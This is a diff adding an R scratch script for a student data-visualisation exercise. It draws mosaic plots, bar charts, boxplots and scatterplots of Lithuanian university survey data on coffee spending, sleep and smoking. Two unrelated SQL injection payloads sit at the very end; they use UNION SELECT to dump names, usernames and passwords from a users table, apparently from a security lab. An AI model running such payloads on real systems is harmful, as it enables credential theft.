@@ -1,0 +1,140 @@
+df <- read.table("benull-10.csv", sep=",", header=TRUE, fileEncoding = "UTF-8-BOM")
+
+barplot(table(df$Lytis, df$Kursas))
+
+mosaicplot(table(df$Kursas, df$miega_diena ,df$Lytis, df$kofeino_vartojimo_pradzia), color = c("darkseagreen2", "indianred2"), main = "Coffee Drinkers by Season and Gender")
+
+1. mosaicplot(table(df$Kursas, df$miega_diena ,df$Lytis, df$kofeino_vartojimo_pradzia), color = c("darkseagreen2", "indianred2"), main = "Kofeino vartotojų jaučiančių mieguistumą dieną pasiskirstymas pagal lytį ir kursą", xlab = "Kursas ir studentų lytis jame", ylab = "Ar miega dieną ir nuo kada vartoja kofeiną", cex.axis = 0.75)
+
+
+
+2. 
+barchart(table(df$Fakultetas, df$Lytis, df$Ruko, df$zino_pasekmes), main = "VU studentai pagal tai ar rūko ir ar žino rūkymo pasekmes")
+barchart(table(df$Fakultetas, df$miega_status, df$Lytis, df$Ruko), main = "VU studentai pagal tai ar rūko ir ar miega dieną")
+
+3. 
+boxplot(df$kavos_islaidos ~ df$Lytis+df$Dieta, 
+        main = "Kavos išlaidų pasiskirstymas pagal lytį ir ar laikosi dietos", 
+        xlab = "Lytis ir ar laikosi dietos", 
+        ylab = "Vidutinės kavos išlaidos")
+
+4. 
+plot(df$kavos_islaidos, df$Amzius, main = "Išlaidos kavai priklausomai nuo lyties ir amžiaus",pch = ifelse(df$Lytis == "Moteris", 16, 17), col = ifelse(df$Lytis == "Moteris", "orange", "purple"), xlab="Kavos išlaidos", ylab = "Amžius")
+df_split <- split(df, df$Lytis)
+for (gender in c("Moteris", "Vyras")) {
+    df_gender <- df_split[[gender]]
+    lines(lowess(df_gender$kavos_islaidos, df_gender$Amzius, f=0.7), col = ifelse(gender == "Moteris", "orange", "purple"), lwd=2, lty=2)}
+
+plot(df$kavos_islaidos, df$Amzius, main = "Išlaidos kavai priklausomai nuo lyties ir amžiaus",pch = ifelse(df$Lytis == "Moteris", 16, 17), cex=c(1.5,1.5), col = ifelse(df$Lytis == "Moteris", "orange", "purple"), xlab="Kavos išlaidos", ylab = "Amžius")
+df_split <- split(df, df$Lytis)
+for (gender in c("Moteris", "Vyras")) {
+    df_gender <- df_split[[gender]]
+    lines(lowess(df_gender$kavos_islaidos, df_gender$Amzius, f=0.7), col = ifelse(gender == "Moteris", "orange", "purple"), lwd=3, lty=2)}
+
+5. 
+new_df <- data.frame(Kavos_islaidos = df$kavos_islaidos, Miego_val = df$miego_val, Kursas = df$Kursas, Amzius = df$Amzius)
+
+colnames(new_df) <- gsub("_", " ", colnames(new_df))
+colnames(new_df) <- gsub("islaidos", "išlaidos", colnames(new_df))
+colnames(new_df) <- gsub("Amzius", "Amžius", colnames(new_df))
+colnames(new_df) <- gsub("val", "valandų", colnames(new_df))
+
+pairs(new_df, pch=c(16,17))
+
+new_df <- data.frame(Kavos_islaidos = df$kavos_islaidos, Miego_val = df$miego_val, Amzius = df$Amzius)
+
+colnames(new_df) <- gsub("_", " ", colnames(new_df))
+colnames(new_df) <- gsub("islaidos", "išlaidos", colnames(new_df))
+colnames(new_df) <- gsub("Amzius", "Amžius", colnames(new_df))
+colnames(new_df) <- gsub("val", "valandų", colnames(new_df))
+
+pairs(new_df, pch=c(16,17), col=c("orange", "cyan"), cex=c(1.5,1.5), main="Kavos išlaidų, miego valandų ir studentų amžiaus požymių koreliacija")
+
+6.
+tabel <- xtabs(df$kavos_islaidos ~ df$Lytis + df$Kursas)
+barplot(as.matrix(tabel), xlab = "Kursas", ylab = "Kavos išlaidos", beside=TRUE, legend=TRUE, main = "Kavos išlaidos pagal kursą ir lytį")
+
+library(dplyr)
+
+# Calculate the average spending on coffee for each level of 'df$Kursas'
+df_avg <- df %>%
+    group_by(Kursas) %>%
+    summarise(avg_kavos_islaidos = mean(kavos_islaidos))
+
+# Sort the levels of 'df$Kursas' based on the average spending in descending order
+sorted_levels <- df_avg$Kursas[order(df_avg$avg_kavos_islaidos, decreasing = TRUE)]
+
+# Create a new factor variable with the levels sorted by average spending
+df$Kursas_sorted <- factor(df$Kursas, levels = sorted_levels)
+
+# Calculate the proportion of average spending relative to the highest average
+prop_heights <- df_avg$avg_kavos_islaidos / max(df_avg$avg_kavos_islaidos)
+
+# Create a color palette for the bars
+colors <- colorRampPalette(c("lightblue", "darkblue"))(length(df_avg$Kursas))
+
+# Plot the data with proportional heights and modified y-axis range
+barplot(prop_heights, col = colors, xlab = "Kursas", ylab = "Proporcionalios kavos išlaidos",
+        ylim = c(0, 1.2), main = "Proporcionalios kavos išlaidos pagal kursus")
+
+# Add text labels for the average spending values
+text(x = 1:length(df_avg$Kursas), y = prop_heights + 0.05, 
+     labels = round(df_avg$avg_kavos_islaidos, digits = 2), 
+     pos = 3, cex = 0.8)
+
+# Reverse the order of legend labels and colors
+legend_labels <- rev(levels(df$Kursas_sorted))
+legend_colors <- rev(colors)
+
+# Define the position of the legend with margins
+legend_x <- "topright"
+legend_y <- max(prop_heights) + 0.05
+
+# Create a legend with color representation for 'df$Kursas'
+legend(legend_x, legend = legend_labels, fill = legend_colors, title = "Kursas", 
+       xjust = 1, yjust = 1, , xpd = TRUE, inset = c(-0.1, 0.01))
+
+----------------------------
+
+library(dplyr)
+
+# Calculate the average spending on coffee for each level of 'df$Kursas'
+df_avg <- df %>%
+    group_by(Kursas) %>%
+    summarise(avg_kavos_islaidos = mean(kavos_islaidos))
+
+# Sort the levels of 'df$Kursas' based on the average spending in descending order
+sorted_levels <- df_avg$Kursas[order(df_avg$avg_kavos_islaidos, decreasing = TRUE)]
+
+# Create a new factor variable with the levels sorted by average spending
+df$Kursas_sorted <- factor(df$Kursas, levels = sorted_levels)
+
+# Calculate the proportion of average spending relative to the highest average
+prop_heights <- df_avg$avg_kavos_islaidos / max(df_avg$avg_kavos_islaidos)
+
+# Create a color palette for the bars
+colors <- colorRampPalette(c("lightblue", "darkblue"))(length(df_avg$Kursas))
+
+# Plot the data with proportional heights and modified y-axis range
+barplot(prop_heights, col = colors, ylab = "Proporcionalios kavos išlaidos",
+        ylim = c(0, 1.2), main = "Proporcionalios kavos išlaidos pagal kursus")
+
+# Add text labels for the average spending values
+text(x = 1:length(df_avg$Kursas), y = prop_heights + 0.05, 
+     labels = round(df_avg$avg_kavos_islaidos, digits = 2), 
+     pos = 3, cex = 1)
+
+# Reverse the order of legend labels and colors
+legend_labels <- rev(levels(df$Kursas_sorted))
+legend_colors <- rev(colors)
+
+# Define the position of the legend with margins
+legend_x <- "topright"
+legend_y <- max(prop_heights) + 0.05
+
+# Create a legend with color representation for 'df$Kursas'
+legend(legend_x, legend = legend_labels, fill = legend_colors, title = "Kursas", 
+       xjust = 1, yjust = 1, , xpd = TRUE, inset = c(-0.1, 0.01))
+
+ %' AND 1=0 UNION SELECT NULL, concat(first_name 0x0a,last_name,0x0a,user,0x0a,password) FROM users #
+ %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
